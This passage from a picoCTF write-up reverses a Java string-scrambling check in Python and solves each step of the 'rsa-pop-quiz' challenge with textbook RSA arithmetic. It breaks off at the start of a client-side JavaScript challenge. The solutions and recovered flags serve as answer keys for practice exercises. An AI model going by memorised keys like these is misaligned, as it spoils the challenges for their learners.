    <span style="color:#ff79c6">return</span> s<span style="color:#ff79c6">.</span><span style="color:#50fa7b">equals</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;jU5t_a_sna_3lpm12g94c_u_4_m7ra41&#34;</span><span style="color:#ff79c6">);</span>
<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>translated into python:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">not_the_flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;jU5t_a_sna_3lpm12g94c_u_4_m7ra41&#34;</span>

buffer <span style="color:#ff79c6">=</span> [<span style="color:#ff79c6">None</span>] <span style="color:#ff79c6">*</span> <span style="color:#8be9fd;font-style:italic">len</span>(not_the_flag)

<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">8</span>):
    buffer[i] <span style="color:#ff79c6">=</span> not_the_flag[i]

<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">8</span>,<span style="color:#bd93f9">16</span>):
    buffer[i] <span style="color:#ff79c6">=</span> not_the_flag[<span style="color:#bd93f9">23</span> <span style="color:#ff79c6">-</span>i]

<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">16</span>,<span style="color:#bd93f9">32</span>, <span style="color:#bd93f9">2</span>):
    buffer[i] <span style="color:#ff79c6">=</span> not_the_flag[<span style="color:#bd93f9">46</span><span style="color:#ff79c6">-</span>i]

<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">31</span>,<span style="color:#bd93f9">16</span>, <span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span>):
    buffer[i] <span style="color:#ff79c6">=</span> not_the_flag[i]

<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;picoCTF{</span><span style="color:#f1fa8c">%s</span><span style="color:#f1fa8c">}&#34;</span> <span style="color:#ff79c6">%</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(buffer))
</code></pre></td></tr></table>
</div>
</div><h2 id="rsa-pop-quiz">rsa-pop-quiz</h2>
<h3 id="quizz-1">Quizz #1</h3>
<pre tabindex="0"><code>#### NEW PROBLEM ###
q : 60413
p : 76753
##### PRODUCE THE FOLLOWING ####
n
IS THIS POSSIBLE and FEASIBLE? (Y/N):Y
</code></pre><p>to calculate n we can use simple python because the number are very small:</p>
<pre tabindex="0"><code>&gt;&gt;&gt; q = 60413
&gt;&gt;&gt; p = 76753
&gt;&gt;&gt; q * p
4636878989
</code></pre><h3 id="quizz-2">Quizz #2</h3>
<pre tabindex="0"><code>#### NEW PROBLEM ####
p : 54269
n : 5051846941
##### PRODUCE THE FOLLOWING ####
q
IS THIS POSSIBLE and FEASIBLE? (Y/N):Y
</code></pre><p>To</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">&gt;&gt;&gt;</span> n <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">5051846941</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> p <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">54269</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> n <span style="color:#ff79c6">/</span> p
<span style="color:#bd93f9">93089</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="quizz-3">Quizz #3</h3>
<pre tabindex="0"><code>#### NEW PROBLEM ####
e : 3
n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913
##### PRODUCE THE FOLLOWING ####
q
p
IS THIS POSSIBLE and FEASIBLE? (Y/N):Y
</code></pre><h3 id="quizz-4">Quizz #4</h3>
<p>n is too big, no solutions on factorDB.com</p>
<pre tabindex="0"><code>#### NEW PROBLEM ####
e : 3
n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913
##### PRODUCE THE FOLLOWING ####
q
p
IS THIS POSSIBLE and FEASIBLE? (Y/N):N
Outstanding move!!!
</code></pre><h3 id="quizz-5">Quizz #5</h3>
<pre tabindex="0"><code>#### NEW PROBLEM ####
q : 66347
p : 12611
##### PRODUCE THE FOLLOWING ####
totient(n)
IS THIS POSSIBLE and FEASIBLE? (Y/N):Y
</code></pre><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">&gt;&gt;&gt;</span> p <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">12611</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> q <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">66347</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> ph <span style="color:#ff79c6">=</span> (p<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)<span style="color:#ff79c6">*</span>(q<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> ph
<span style="color:#bd93f9">836623060</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="quizz-6">Quizz #6</h3>
<p>No solutions to factorize n in factorDB.com</p>
<pre tabindex="0"><code>#### NEW PROBLEM ####
plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
e : 3
n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
##### PRODUCE THE FOLLOWING ####
ciphertext
IS THIS POSSIBLE and FEASIBLE? (Y/N):
</code></pre><p>Given <code>n</code> and <code>e</code> , there is a simple formula to encrypt any <code>plaintext</code>:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">&gt;&gt;&gt;</span> plaintext <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> n <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> e <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">3</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">pow</span>(plaintext, e, n)
<span style="color:#bd93f9">256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="quizz-7">Quizz #7</h3>
<p>If I am notable to factorize n on factorDB.com, then there is no chance I can decrypt:</p>
<pre tabindex="0"><code>#### NEW PROBLEM ####
ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323
e : 3
n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359
##### PRODUCE THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N):N
</code></pre><h3 id="quizz-8">Quizz 8</h3>
<pre tabindex="0"><code>#### NEW PROBLEM ####
q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
e : 65537
##### PRODUCE THE FOLLOWING ####
d
IS THIS POSSIBLE and FEASIBLE? (Y/N):Y
</code></pre><p>to obtain d, we need to:</p>
<ol>
<li>calculate the totient ph</li>
<li>use module <code>gmpy2</code> to calculate <code>d</code> the modular multiplicative inverse of e (mod λ(n)) according to <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">Wikipedia</a></li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">&gt;&gt;&gt;</span> q <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> p <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> e <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">65537</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> n <span style="color:#ff79c6">=</span> p <span style="color:#ff79c6">*</span> q
<span style="color:#ff79c6">&gt;&gt;&gt;</span> ph <span style="color:#ff79c6">=</span> (p <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">*</span> (q <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#ff79c6">import</span> gmpy2
<span style="color:#ff79c6">&gt;&gt;&gt;</span> d <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>invert(e, ph)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> d
mpz(<span style="color:#bd93f9">1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729</span>)
</code></pre></td></tr></table>
</div>
</div><h3 id="quizz-9">Quizz #9</h3>
<pre tabindex="0"><code>#### NEW PROBLEM ####
p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
ciphertext : 18031488536864379496089550017272599246134435121343229164236671388038630752847645738968455413067773166115234039247540029174331743781203512108626594601293283737392240326020888417252388602914051828980913478927759934805755030493894728974208520271926698905550119698686762813722190657005740866343113838228101687566611695952746931293926696289378849403873881699852860519784750763227733530168282209363348322874740823803639617797763626570478847423136936562441423318948695084910283653593619962163665200322516949205854709192890808315604698217238383629613355109164122397545332736734824591444665706810731112586202816816647839648399
e : 65537
n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
##### PRODUCE THE FOLLOWING ####
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N):Y
</code></pre><p>In python:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">&gt;&gt;&gt;</span> p <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> ciphertext <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">18031488536864379496089550017272599246134435121343229164236671388038630752847645738968455413067773166115234039247540029174331743781203512108626594601293283737392240326020888417252388602914051828980913478927759934805755030493894728974208520271926698905550119698686762813722190657005740866343113838228101687566611695952746931293926696289378849403873881699852860519784750763227733530168282209363348322874740823803639617797763626570478847423136936562441423318948695084910283653593619962163665200322516949205854709192890808315604698217238383629613355109164122397545332736734824591444665706810731112586202816816647839648399</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> e <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">65537</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> n <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> q <span style="color:#ff79c6">=</span> n <span style="color:#ff79c6">//</span> p
<span style="color:#ff79c6">&gt;&gt;&gt;</span> ph <span style="color:#ff79c6">=</span> (p <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">*</span> (q <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> d <span style="color:#ff79c6">=</span> gmpy2<span style="color:#ff79c6">.</span>invert(e, ph)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> plaintext <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">pow</span>(ciphertext, d, n)
<span style="color:#ff79c6">&gt;&gt;&gt;</span> plaintext
mpz(<span style="color:#bd93f9">14311663942709674867122208214901970650496788151239520971623411712977120586163535880168563325</span>)
</code></pre></td></tr></table>
</div>
</div><h3 id="flag">Flag</h3>
<pre><code>If you convert the last plaintext to a hex number, then ascii, you'll find what you need! ;)
</code></pre>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">&gt;&gt;&gt;</span> plaintext <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">14311663942709674867122208214901970650496788151239520971623411712977120586163535880168563325</span>
<span style="color:#ff79c6">&gt;&gt;&gt;</span> <span style="color:#8be9fd;font-style:italic">bytes</span><span style="color:#ff79c6">.</span>fromhex(<span style="color:#8be9fd;font-style:italic">hex</span>(plaintext)[<span style="color:#bd93f9">2</span>:])<span style="color:#ff79c6">.</span>decode()
<span style="color:#f1fa8c">&#39;picoCTF{wA8_th4t$_ill3aGal[..SNIP..]}&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="client-side-again">Client-side-again</h2>
<p>We can observe some Javascript with elements of flag. We use a JS beautifier to improve the code clarity:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
